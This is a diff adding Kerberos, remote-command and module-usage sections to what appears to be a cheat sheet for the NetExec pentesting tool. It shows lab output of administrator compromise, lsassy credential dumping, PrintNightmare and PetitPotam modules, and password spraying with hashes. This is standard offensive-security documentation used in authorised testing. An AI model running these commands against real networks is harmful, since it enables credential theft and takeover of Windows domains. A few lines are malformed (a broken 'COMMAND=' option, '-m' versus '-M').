@@ -128,11 +128,66 @@ Using the --continue-on-success flag will continue spraying even after a valid p
 netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce --continue-on-success
 ```
 
+## Using Kerberos
+```
+Using Kerberos authentication with NetExec.
+nxc does support Kerberos authentication there are two options, directly using a password/hash or using a ticket and using the KRB5CCNAME env name to specify the ticket.
 
+when using the option -k or--use-kcache, you need to specify the same hostname (FQDN) as the one from the kerberos ticket:
 
+$ sudo nxc smb zoro.gold.local -k -u bonclay -p Ocotober2022
+SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
+SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay
 
+Or, using --use-kcache:
 
+$ export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache 
+$ nxc smb zoro.gold.local --use-kcache
+SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
+SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
+$ sudo nxc smb zoro.gold.local --use-kcache -x whoami
+SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
+SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
+SMB         zoro.gold.local 445    ZORO             [+] Executed command 
+SMB         zoro.gold.local 445    ZORO             gold\administrator
 
+$ export KRB5CCNAME=/home/bonclay/impacket/bonclay.ccache
+$ sudo nxc smb zoro.gold.local --use-kcache -x whoami
+SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
+SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay
+
+Example with LDAP and option --kdcHost
+poetry run NetExec ldap poudlard.wizard -k --kdcHost dc01.poudlard.wizard 
+SMB poudlard.wizard 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:poudlard.wizard) (signing:True) (SMBv1:False) 
+LDAP poudlard.wizard 389 DC01 [+] poudlard.wizard\
+```
+
+## Using Modules
+```
+Viewing Available Modules for a Protocol.
+Run nxc <protocol> -L to view available modules for the specified protocol.
+For example to view all modules for the SMB protocol:
+nxc smb -L
+```
+
+## Viewing Module Options
+```
+Run nxc <protocol> -M <module name> --options to view a modules supported options, e.g:
+nxc smb -M lsassy --options
+```
+
+## Using Module Options
+```
+Module options are specified with the -o flag.
+All options are specified in the form of KEY=value (msfvenom style)
+nxc <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M lsassy -o COMMAND=xxxxxxxxug'
+```
+
+## Running Multiple Modules (new!)
+```
+Simply define all the modules you want, each proceeded by a -m option flag:
+nxc <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M spooler -M printnightmare -M shadowcoerce -M petitpotam
+```
 
 
 
